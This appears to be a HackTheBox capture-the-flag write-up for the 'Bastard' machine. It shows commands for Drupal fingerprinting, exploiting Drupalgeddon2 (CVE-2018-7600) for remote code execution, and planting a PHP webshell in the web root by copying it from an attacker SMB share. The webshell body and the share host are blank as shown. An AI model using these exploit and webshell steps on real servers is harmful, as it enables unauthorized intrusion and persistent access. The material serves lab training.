

# Bastard

**Platform:** HackTheBox  
**OS:** Windows  
**Difficulty:** Medium  
**Date:** April 2026

---

## Summary

Windows machine running Drupal 7.54, vulnerable to Drupalgeddon2
(CVE-2018-7600), an unauthenticated remote code execution vulnerability.
Initial access obtained via RCE. Privilege escalation achieved by
abusing SeImpersonatePrivilege with JuicyPotato.

---

## 1. Reconnaissance

Full port scan:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.129.22.229 -oG allPorts
```

**Open ports:**

| Port | Service |
|------|---------|
| 80 | HTTP IIS |
| 135 | MSRPC |
| 49154 | MSRPC |

TTL=127 confirms Windows target.

Detailed scan:

```bash
nmap -sCV -Pn -p80 10.129.22.229 -oN targeted
```

---

## 2. Web Enumeration

Ran Nikto against the web server:

```bash
nikto -h http://10.129.22.229
```

Found `robots.txt` with 68 entries. Checked `CHANGELOG.txt`:

```bash
curl http://10.129.22.229/CHANGELOG.txt | head -5
```

Identified **Drupal 7.54**.

---

## 3. Exploitation — CVE-2018-7600 (Drupalgeddon2)

Cloned exploit:

```bash
git clone https://github.com/pimps/CVE-2018-7600
cd CVE-2018-7600
pip install requests --break-system-packages
```

Confirmed RCE:

```bash
python3 drupa7-CVE-2018-7600.py -c "whoami" http://10.129.22.229
# nt authority\iusr
```

Checked privileges:

```bash
python3 drupa7-CVE-2018-7600.py -c "whoami /priv" http://10.129.22.229
# SeImpersonatePrivilege Enabled
```

---

## 4. Webshell Upload via SMB

HTTP transfers blocked by Windows firewall. Used SMB instead.

Created PHP webshell:

```bash
echo '' > /tmp/shell.php
```

Served via SMB:

```bash
sudo impacket-smbserver share /tmp -smb2support
```

Found Drupal installation path:

```bash
python3 drupa7-CVE-2018-7600.py -c "where /r C:\\ index.php" http://10.129.22.229
# C:\inetpub\drupal-7.54\index.php
```

Copied webshell to web root:

```bash
python3 drupa7-CVE-2018-7600.py \
-c "copy \\\\\\share\\shell.php C:\\inetpub\\drupal-7.54\\shell.php" \
http://10.129.22.229
```

Verified RCE via browser:
http://10.129.22.229/shell.php?cmd=whoami
nt authority\iusr
